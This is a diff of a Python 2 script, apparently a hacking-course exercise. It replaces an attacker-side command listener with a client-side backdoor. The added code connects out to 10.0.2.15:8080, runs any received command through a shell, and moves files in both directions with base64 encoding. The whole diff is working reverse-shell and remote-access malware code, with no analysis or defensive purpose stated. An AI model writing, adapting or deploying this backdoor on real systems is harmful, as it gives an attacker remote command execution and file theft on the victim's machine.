@@ -1,50 +1,62 @@
 import socket
+import subprocess
 import json
+import os
+import base64
 
+class MySocket:
+	def __init__(self, ip, port):
+		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		self.my_connection.connect((ip,port))
 
+	def command_execution(self, command):
+		return subprocess.check_output(command, shell=True)
 
-class SocketListener:
-    def __init__(self,ip,port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip, port))
-        listener.listen(0)
-        print("listening on")
-        (self.connection, address) = listener.accept()
-        print("Connected from " + str(address))
+	def json_send(self, data):
+		json_data = json.dumps(data)
+		self.my_connection.send(json_data)
 
-    def json_send(self,data):
-        json_data = json.dumps(data)
-        self.connection.send(json_data)
+	def json_receive(self):
+		json_data = ""
+		while True:
+			try:
+				json_data = json_data + self.my_connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
 
-    def json_recv(self):
-        json_data = ""
-        while True:
-            try:
-                json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data)
-            except ValueError:
-                continue
+	def execute_cd_command(self,directory):
+		os.chdir(directory)
+		return "Cd to " + directory
 
-    def command_interaction(self,command_input):
-        self.json_send(command_input)
+	def get_file_contents(self,path):
+		with open(path,"rb") as my_file:
+			return base64.b64encode(my_file.read())
 
-        if command_input[0] == "exit":
-            self.connection.close()
-            exit()
+	def save_file(self,path,content):
+		with open(path,"wb") as my_file:
+			my_file.write(base64.b64decode(content))
+			return "Download OK"
 
-        if command_input[0] == "quit":
-            self.connection.close()
-            exit()
+	def start_socket(self):
+		while True:
+			command = self.json_receive()
+			try:
+				if command[0] == "quit":
+					self.my_connection.close()
+					exit()
+				elif command[0] == "cd" and len(command) > 1:
+					command_output = self.execute_cd_command(command[1])
+				elif command[0] == "download":
+					command_output = self.get_file_contents(command[1])
+				elif command[0] == "upload":
+					command_output = self.save_file(command[1],command[2])
+				else:
+					command_output = self.command_execution(command)
+			except Exception:
+				command_output = "Error!"
+			self.json_send(command_output)
+		self.my_connection.close()
 
-        return self.json_recv()
-
-    def listening(self):
-        while True:
-            command_input = raw_input("enter command: ")
-            command_input = command_input.split(" ")
-            command_output = self.command_interaction(command_input)
-            print(command_output)
-
-socket_listener = SocketListener("192.168.1.59",8080)
-socket_listener.listening()
+my_socket_object = MySocket("10.0.2.15",8080)
+my_socket_object.start_socket()
